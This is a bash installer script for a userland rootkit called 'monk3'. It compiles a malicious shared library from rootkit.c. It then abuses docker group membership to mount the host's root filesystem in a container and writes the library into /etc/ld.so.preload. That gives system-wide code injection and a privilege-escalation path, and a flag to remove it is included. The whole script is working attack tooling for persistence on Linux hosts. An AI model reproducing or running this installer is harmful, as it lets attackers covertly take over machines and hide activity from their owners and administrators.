#!/bin/bash

GREEN="\e[32m"
GREENBG="\e[1;42m"
RED="\e[0;31m"
RESETCOL="\e[0m"
LIB="/lib/librootkit"
MONK3PATH=$(pwd)

function show_usage () { echo -e "USAGE:\n    -b          build flag (compiles and loads monk3.lib.so into /etc/ld.so.preload)\n    -r          remove flag (removes monk3.lib.so from /etc/ld.so.preload)\n"; }

if [ "$#" -eq 0 ]; then
    echo -e "${RED}No arguments suplied!${RESETCOL}"
    show_usage
    exit 1
elif [ "$#" -eq 2 ]; then
    echo -e "${RED}Too many arguments!${RESETCOL}"
    exit 1
fi

if groups | grep -q "docker"; then
    echo -e "${GREENBG}${USER} included in docker group${RESETCOL}"
else
    echo -e "${RED}${USER} not included in docker group\nPAYLOAD FAILED${RESETCOL}"
    exit 1
fi

for arg in "$@"; do
    case "$arg" in
    -b)
        echo -e "${GREEN}Compiling source & exporting malicious library...${RESETCOL}"
        gcc -shared -fPIC -D_GNU_SOURCE rootkit.c -o monk3.lib.so -ldl
        if [ -d "$LIB" ]; then
            cd /
            docker run -v /:/mnt -i -t alpine sh -c "mv mnt${MONK3PATH}/monk3.lib.so mnt/lib/librootkit/monk3.lib.so; echo '/lib/librootkit/monk3.lib.so' >> mnt/etc/ld.so.preload"
        else
            cd /
            docker run -v /:/mnt -i -t alpine sh -c "mkdir mnt/lib/librootkit; mv mnt${MONK3PATH}/monk3.lib.so mnt/lib/librootkit/monk3.lib.so; echo '/lib/librootkit/monk3.lib.so' >> mnt/etc/ld.so.preload"
        fi
        ;;
    -r)
        echo -e "${GREEN}Wiping /etc/ld.so.preload & removing compiled source...${RESETCOL}"
        docker run -v /:/mnt -i -t alpine sh -c "rm -rf mnt/etc/ld.so.preload mnt/lib/librootkit/monk3.lib.so"
        ;;
    esac
done
